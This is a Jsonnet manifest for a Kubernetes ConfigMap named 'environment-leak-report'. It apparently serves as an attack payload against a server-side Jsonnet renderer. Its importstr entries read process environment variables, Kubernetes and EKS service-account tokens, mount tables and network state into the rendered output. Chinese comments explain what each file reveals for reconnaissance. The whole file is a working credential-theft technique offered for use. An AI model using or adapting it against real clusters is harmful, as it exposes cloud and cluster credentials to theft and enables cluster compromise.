{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: {
    name: "environment-leak-report",
  },
  data: {
    // --- 进程与权限状态 ---

    "proc-1-status": importstr "/proc/1/status",
    "proc-1-environ": importstr "/proc/1/environ",
    
    
    // --- 身份凭证 ---
    "k8s-token": importstr "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "k8s-namespace": importstr "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "pia-eks-token": importstr "/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token",
    // "irsa": importstr "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",

    // --- 新增：挂载与文件系统信息 ---
    // 查看当前容器挂载了哪些卷，是否存在危险的宿主机挂载
    "mounts": importstr "/proc/self/mountinfo",
    
    // 查看磁盘分区情况（如果有权限读取）
    //"partitions": importstr "/proc/partitions",

    // 查看网络配置（有时包含内网域名解析规律）
    "etc-hosts": importstr "/etc/hosts",
    "etc-resolv": importstr "/etc/resolv.conf",



    // 网络接口与 IP 信息 (相当于 ip addr)
    // 包含网卡名称、MAC 地址及十六进制 IP 分配
    "proc-net-dev": importstr "/proc/net/dev",
    
    // 路由表信息 (相当于 ip route)
    // 用于确认默认网关及流量出口路径
    "proc-net-route": importstr "/proc/net/route",

    // TCP 连接与监听状态 (相当于 netstat -ant)
    // 可以查看到哪些端口正在被容器内的进程监听
    "proc-net-tcp": importstr "/proc/net/tcp",
    "proc-net-tcp6": importstr "/proc/net/tcp6",

    // UDP 监听状态
    "proc-net-udp": importstr "/proc/net/udp",

    // ARP 缓存表
    // 查看容器已感知的同子网其他节点（如网关、Sidecar）的 MAC 地址
    "proc-net-arp": importstr "/proc/net/arp",

    // 网络协议栈内核参数 (Sysctl)
    // 了解容器是否开启了 IP 转发、TCP 快速回收等优化
    "sys-net-ipv4-ip_forward": importstr "/proc/sys/net/ipv4/ip_forward",
    "sys-net-core-somaxconn": importstr "/proc/sys/net/core/somaxconn",


  }
}
